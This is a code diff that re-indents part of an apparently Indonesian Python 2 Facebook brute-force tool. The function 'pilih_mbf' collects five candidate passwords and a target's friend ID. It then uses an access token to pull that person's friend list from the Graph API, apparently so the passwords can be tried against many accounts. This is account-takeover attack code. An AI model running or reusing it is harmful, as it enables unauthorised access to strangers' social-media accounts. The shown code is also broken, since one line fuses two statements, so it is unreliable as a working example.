@@ -1032,20 +1032,20 @@ def pilih_mbf():
 	pass4 = raw_input("\033[1;36m[4] \033[1;93mPassword \033[1;91m: \033[1;97m")
 	pass5 = raw_input("\033[1;36m[5] \033[1;93mPassword \033[1;91m: \033[1;97m")
 	print 42*"\033[1;96m="
-		ids = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+ids+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-			mbf()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+ids+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+	ids = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+	try:
+		jok = requests.get("https://graph.facebook.com/"+ids+"?access_token="+toket)
+		op = json.loads(jok.text)
+		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+	except KeyError:
+		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
+		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+		mbf()
+	jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+	r = requests.get("https://graph.facebook.com/"+ids+"/friends?access_token="+toket)
+	z = json.loads(r.text)
+	for i in z['data']:
+		id.append(i['id'])print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
 	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
